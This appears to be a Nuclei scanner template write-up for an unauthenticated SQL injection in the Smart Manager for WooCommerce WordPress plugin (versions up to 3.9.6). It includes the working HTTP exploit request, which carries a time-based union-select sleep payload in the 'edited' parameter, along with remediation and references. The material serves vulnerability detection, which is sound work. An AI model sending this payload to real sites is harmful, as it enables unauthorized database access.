# Nuclei Template: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection
**Template ID:** wp-smart-manager-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`wp-smart-manager-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The Smart Manager For WooCommerce – Stock Management, Bulk Edit & more… WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt HTTP/1.1
Host: {{Hostname}}

@timeout: 15s
POST /wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D
```

## Remediation
Fixed in version 3.9.7

## References
- https://wpscan.com/vulnerability/e060fbff-792f-4fb5-baa5-82d80240ec99
- http://cinu.pl/research/wp-plugins/mail_0666ceeca20683907bf82514e8f93e0f.html
- https://wordpress.org/plugins/smart-manager-for-wp-e-commerce/
